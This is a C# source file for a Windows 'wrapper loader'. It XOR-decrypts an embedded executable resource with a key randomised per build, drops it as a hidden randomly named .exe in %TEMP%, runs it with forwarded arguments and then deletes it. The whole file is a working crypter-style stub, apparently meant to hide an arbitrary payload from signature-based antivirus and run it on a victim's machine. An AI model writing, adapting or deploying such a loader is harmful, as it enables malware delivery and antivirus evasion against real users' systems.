// Windows wrapper loader (compiled by csc.exe via build_wrapper.ps1).
//
// At runtime this loader:
//   1. Reads the embedded "p" manifest resource (XOR-encrypted payload)
//   2. XOR-decrypts it in memory with the key spliced in below
//   3. Writes a hidden _<guid>.exe under %TEMP%
//   4. Process.Start's that file with all wrapper args forwarded
//   5. Waits for it to exit, deletes the temp file in the finally block,
//      and propagates the child's exit code
//
// The build script substitutes __KEY_BYTES__ with the 32 random bytes
// generated for this build. Each build is unique.
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;

internal static class W
{
    private static readonly byte[] K = new byte[] { __KEY_BYTES__ };
    private const string ResName = "p";

    private static int Main(string[] args)
    {
        byte[] data;
        try
        {
            var asm = Assembly.GetExecutingAssembly();
            using (var s = asm.GetManifestResourceStream(ResName))
            {
                if (s == null) { Console.Error.WriteLine("[-] payload missing"); return 1; }
                using (var ms = new MemoryStream((int)s.Length))
                {
                    s.CopyTo(ms);
                    data = ms.ToArray();
                }
            }
        }
        catch (Exception ex) { Console.Error.WriteLine("[-] read failed: " + ex.Message); return 1; }

        int kl = K.Length;
        for (int i = 0; i < data.Length; i++) data[i] ^= K[i % kl];

        string tmp = Path.Combine(Path.GetTempPath(), "_" + Guid.NewGuid().ToString("N") + ".exe");
        try { File.WriteAllBytes(tmp, data); }
        catch (Exception ex) { Console.Error.WriteLine("[-] write failed: " + ex.Message); return 1; }

        try { File.SetAttributes(tmp, FileAttributes.Hidden); } catch { }

        Array.Clear(data, 0, data.Length);

        int code = 1;
        try
        {
            var psi = new ProcessStartInfo(tmp);
            psi.UseShellExecute = false;
            psi.Arguments = BuildArgs(args);
            psi.WorkingDirectory = Environment.CurrentDirectory;
            using (var p = Process.Start(psi))
            {
                if (p == null) { Console.Error.WriteLine("[-] start failed"); return 1; }
                p.WaitForExit();
                code = p.ExitCode;
            }
        }
        catch (Exception ex) { Console.Error.WriteLine("[-] exec failed: " + ex.Message); return 1; }
        finally
        {
            for (int i = 0; i < 10; i++)
            {
                try { File.Delete(tmp); break; }
                catch { System.Threading.Thread.Sleep(150); }
            }
        }
        return code;
    }

    private static string BuildArgs(string[] args)
    {
        if (args == null || args.Length == 0) return string.Empty;
        var sb = new StringBuilder();
        for (int i = 0; i < args.Length; i++)
        {
            if (i > 0) sb.Append(' ');
            sb.Append(EscapeArg(args[i]));
        }
        return sb.ToString();
    }

    // CommandLineToArgvW-compatible escaping: handles spaces, quotes, and runs of
    // backslashes per the rules documented at
    // https://docs.microsoft.com/cpp/cpp/main-function-command-line-args
    private static string EscapeArg(string a)
    {
        if (a == null) return "\"\"";
        if (a.Length > 0 && a.IndexOfAny(new[] { ' ', '\t', '\n', '\v', '"' }) < 0) return a;
        var sb = new StringBuilder();
        sb.Append('"');
        int i = 0;
        while (i < a.Length)
        {
            int bs = 0;
            while (i < a.Length && a[i] == '\\') { bs++; i++; }
            if (i == a.Length) { sb.Append('\\', bs * 2); }
            else if (a[i] == '"') { sb.Append('\\', bs * 2 + 1); sb.Append('"'); i++; }
            else { sb.Append('\\', bs); sb.Append(a[i]); i++; }
        }
        sb.Append('"');
        return sb.ToString();
    }
}
